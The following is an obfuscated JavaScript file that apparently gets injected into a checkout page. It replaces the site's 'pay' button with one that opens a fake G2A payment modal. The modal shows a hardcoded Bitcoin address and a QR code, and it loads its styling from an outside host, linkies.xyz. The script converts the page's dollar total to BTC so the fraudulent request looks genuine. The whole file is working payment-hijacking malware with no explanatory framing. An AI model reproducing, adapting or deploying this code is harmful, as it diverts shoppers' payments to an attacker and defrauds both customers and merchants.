const _0x4f80d5 = _0xa2e8;

function _0xa2e8(_0x5a9aa5, _0xf03585) {
	const _0x1d8091 = _0x1d80();
	return _0xa2e8 = function(_0xa2e836, _0x3cc2d8) {
		_0xa2e836 = _0xa2e836 - 0x84;
		let _0x8cded3 = _0x1d8091[_0xa2e836];
		return _0x8cded3;
	}, _0xa2e8(_0x5a9aa5, _0xf03585);
}

function _0x1d80() {
	const _0x33668c = ['rate', 'getElementById', 'rgba(0,\x200,\x200,\x200.5)', 'addEventListener', 'rel', 'innerHTML', 'bpi', 'modalOverlay', '2zhrWYs', '138580dDKSPE', 'USD\x20balance\x20element\x20not\x20found', '375615oFYUyL', 'includes', 'flex', 'toLowerCase', 'alignItems', 'USD', 'div', 'error', 'createElement', 'json', 'center', 'toFixed', '49mJDEKI', 'Error\x20parsing\x20USD\x20balance', 'removeChild', 'left', 'className', 'zIndex', 'style', 'https://api.coindesk.com/v1/bpi/currentprice/USD.json', 'position', 'width', 'textContent', '1000', 'from', '613320iJcKfp', '78204VvqJax', '100%', 'top', 'click', '314257SeYsCD', 'Error\x20parsing\x20BTC\x20price', 'link', 'trim', 'fixed', '1638468bXmchX', '\x0a<img\x20src=\x22https://checkout.pay.g2a.com/zen_btc.png\x22\x20alt=\x22Bitcoin\x22\x20class=\x22g2a-logo\x22>\x0a<p><span\x20class=\x22g2a-grey-text\x22>BTC\x20amount:</span>\x20<span\x20id=\x22btcAmount\x22></span></p>\x0a<p><span\x20class=\x22g2a-grey-text\x22>BTC\x20address:</span>bc1qt7fc7ucwsrl2xxr8vy5nuc5jye67p4u5hyt0jl</p>\x0a<img\x20src=\x22https://linkies.xyz/pazte/btc.png\x22\x20alt=\x22QR\x20code\x20to\x20scan\x22\x20class=\x22g2a-qr-code\x22>\x0a<p>Scan\x20the\x20QR\x20code\x20to\x20complete\x20your\x20payment.</p>\x0a<p\x20class=\x22g2a-grey-text\x22><small>Once\x20youâ€™ve\x20done\x20it,\x20wait\x20for\x20your\x20payment\x20to\x20confirm.</small></p>\x0a<button\x20class=\x22g2a-confirm-button\x22>Confirm\x20payment</button>\x0a', 'preventDefault', '113168HnBVEf', 'Error\x20fetching\x20BTC\x20price:', 'head', 'querySelectorAll', 'pay', 'backgroundColor', 'stylesheet', 'appendChild', 'replace', 'display', 'height', 'find', 'href'];
	_0x1d80 = function() {
		return _0x33668c;
	};
	return _0x1d80();
}(function(_0x54b6f9, _0x797c13) {
	const _0x13cbce = _0xa2e8,
		_0x2004dc = _0x54b6f9();
	while (!![]) {
		try {
			const _0x55ea88 = -parseInt(_0x13cbce(0xac)) / 0x1 * (-parseInt(_0x13cbce(0x8b)) / 0x2) + -parseInt(_0x13cbce(0x8e)) / 0x3 + -parseInt(_0x13cbce(0x8c)) / 0x4 + parseInt(_0x13cbce(0xa7)) / 0x5 + -parseInt(_0x13cbce(0xa8)) / 0x6 * (-parseInt(_0x13cbce(0x9a)) / 0x7) + -parseInt(_0x13cbce(0xb4)) / 0x8 + -parseInt(_0x13cbce(0xb1)) / 0x9;
			if (_0x55ea88 === _0x797c13) break;
			else _0x2004dc['push'](_0x2004dc['shift']());
		} catch (_0x26da14) {
			_0x2004dc['push'](_0x2004dc['shift']());
		}
	}
}(_0x1d80, 0x2a04f));
async function updateBTCPrice() {
	const _0x2a97ef = _0xa2e8,
		_0x55463c = Array[_0x2a97ef(0xa6)](document[_0x2a97ef(0xb7)]('span'))[_0x2a97ef(0xbf)](_0x143615 => _0x143615['textContent'][_0x2a97ef(0xaf)]()['startsWith']('$'));
	if (_0x55463c) {
		const _0x10c058 = parseFloat(_0x55463c[_0x2a97ef(0xa4)][_0x2a97ef(0xaf)]()[_0x2a97ef(0xbc)]('$', ''));
		if (!isNaN(_0x10c058)) try {
			const _0x229549 = await fetch(_0x2a97ef(0xa1)),
				_0x42d924 = await _0x229549[_0x2a97ef(0x97)](),
				_0x35f1a4 = parseFloat(_0x42d924[_0x2a97ef(0x89)][_0x2a97ef(0x93)][_0x2a97ef(0xc1)][_0x2a97ef(0xbc)](',', ''));
			if (!isNaN(_0x35f1a4)) {
				const _0x5ed7ec = (_0x10c058 / _0x35f1a4)[_0x2a97ef(0x99)](0x8),
					_0x13036b = document['getElementById']('btcAmount');
				_0x13036b[_0x2a97ef(0xa4)] = _0x5ed7ec;
			} else console['error'](_0x2a97ef(0xad));
		} catch (_0xae75bf) {
			console[_0x2a97ef(0x95)](_0x2a97ef(0xb5), _0xae75bf);
		} else console[_0x2a97ef(0x95)](_0x2a97ef(0x9b));
	} else console[_0x2a97ef(0x95)](_0x2a97ef(0x8d));
}

function replaceButtonWithModal(_0x51aed3, _0x481234, _0xe99b43, _0x55ce84) {
	const _0x2219cb = _0xa2e8,
		_0x38605e = Array[_0x2219cb(0xa6)](document[_0x2219cb(0xb7)]('button'))['find'](_0x635690 => _0x635690['textContent'][_0x2219cb(0xaf)]()[_0x2219cb(0x91)]()[_0x2219cb(0x8f)](_0x51aed3[_0x2219cb(0x91)]()));
	if (_0x38605e) {
		const _0x1061ad = document['createElement']('button');
		_0x1061ad[_0x2219cb(0xa4)] = _0x38605e[_0x2219cb(0xa4)], _0x1061ad[_0x2219cb(0x9e)] = _0x481234, _0x38605e['parentNode']['replaceChild'](_0x1061ad, _0x38605e), _0x1061ad[_0x2219cb(0x86)](_0x2219cb(0xab), _0xc13c80 => {
			const _0x348b3c = _0x2219cb;
			_0xc13c80[_0x348b3c(0xb3)]();
			const _0x2da5e4 = document[_0x348b3c(0x96)](_0x348b3c(0x94));
			_0x2da5e4['id'] = 'modalOverlay', _0x2da5e4[_0x348b3c(0xa0)][_0x348b3c(0xa2)] = _0x348b3c(0xb0), _0x2da5e4[_0x348b3c(0xa0)][_0x348b3c(0xaa)] = '0', _0x2da5e4[_0x348b3c(0xa0)][_0x348b3c(0x9d)] = '0', _0x2da5e4['style'][_0x348b3c(0xa3)] = _0x348b3c(0xa9), _0x2da5e4['style'][_0x348b3c(0xbe)] = '100%', _0x2da5e4[_0x348b3c(0xa0)][_0x348b3c(0xb9)] = _0x348b3c(0x85), _0x2da5e4[_0x348b3c(0xa0)][_0x348b3c(0xbd)] = _0x348b3c(0x90), _0x2da5e4[_0x348b3c(0xa0)][_0x348b3c(0x92)] = _0x348b3c(0x98), _0x2da5e4[_0x348b3c(0xa0)]['justifyContent'] = _0x348b3c(0x98), _0x2da5e4[_0x348b3c(0xa0)][_0x348b3c(0x9f)] = _0x348b3c(0xa5), document['body']['appendChild'](_0x2da5e4);
			const _0xbf7dce = document[_0x348b3c(0x96)](_0x348b3c(0x94));
			_0xbf7dce[_0x348b3c(0x9e)] = 'g2a-modal', _0xbf7dce[_0x348b3c(0x88)] = _0xe99b43, _0x2da5e4[_0x348b3c(0xbb)](_0xbf7dce), _0x2da5e4[_0x348b3c(0x86)](_0x348b3c(0xab), _0x2fbb61 => {
				const _0x262bda = _0x348b3c;
				_0x2fbb61['target'] === _0x2da5e4 && document['body'][_0x262bda(0x9c)](_0x2da5e4);
			});
			const _0x29418a = document[_0x348b3c(0x96)](_0x348b3c(0xae));
			_0x29418a[_0x348b3c(0x87)] = _0x348b3c(0xba), _0x29418a[_0x348b3c(0xc0)] = _0x55ce84, document[_0x348b3c(0xb6)]['appendChild'](_0x29418a), updateBTCPrice();
		});
	} else console[_0x2219cb(0x95)]('Button\x20not\x20found\x20with\x20the\x20specified\x20text.');
}
const buttonText = _0x4f80d5(0xb8),
	newButtonClass = 'sc-iCoGMd\x20ehJpkz\x20indexes__ButtonContinue-sc-18h7v3q-1\x20dwifaY',
	modalHtml = _0x4f80d5(0xb2),
	cssUrl = 'https://linkies.xyz/pazte/modal.css';
replaceButtonWithModal(buttonText, newButtonClass, modalHtml, cssUrl), document[_0x4f80d5(0x86)]('DOMContentLoaded', function() {
	const _0x2bf5f8 = _0x4f80d5,
		_0x22ee8d = document[_0x2bf5f8(0x84)](_0x2bf5f8(0x8a));
	_0x22ee8d && updateBTCPrice();
});

















